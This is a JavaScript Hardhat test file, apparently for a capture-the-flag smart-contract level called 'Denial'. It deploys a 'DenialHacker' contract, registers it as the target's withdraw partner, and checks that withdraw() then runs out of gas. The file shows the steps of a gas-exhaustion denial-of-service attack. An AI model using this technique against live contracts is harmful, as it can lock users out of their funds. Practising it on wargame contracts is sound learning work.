const { expect } = require("chai");
const { ethers } = require("hardhat");
const {
    constants,
    expectRevert,
} = require('@openzeppelin/test-helpers');
require('dotenv').config({ path: __dirname + '/.env' });

const hre = require("hardhat");

const ONE_GWEI = 1_000_000_000;

describe.only("Denial hack", function() {
    beforeEach(async function() {
        [player] = await ethers.getSigners();
        hacker = await (await ethers.getContractFactory("DenialHacker")).deploy();
        hacker.deployed();
        denial = await ethers.getContractAt("Denial", process.env.DENIAL_ADDRESS);
});
    describe("Hack test", function() {
        it("Should run out of gas", async function() {
            await denial.setWithdrawPartner(hacker.address);
            await expectRevert.outOfGas(denial.withdraw({gasLimit:2_000_000}));
        });
    });
});